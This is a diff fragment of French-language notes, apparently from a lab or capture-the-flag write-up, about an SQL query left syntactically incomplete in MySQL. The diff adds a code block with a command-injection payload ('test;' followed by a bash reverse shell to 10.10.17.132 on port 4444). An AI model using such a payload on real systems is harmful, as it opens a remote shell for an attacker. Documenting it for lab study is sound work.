@@ -61,3 +61,8 @@ MySQL est dans un état **impossible** :
 - requête **syntaxiquement incomplète**
 Le parseur **attend encore du SQL**
 
+
+```
+test; bash -i >& /dev/tcp/10.10.17.132/4444 0>&1
+```
+
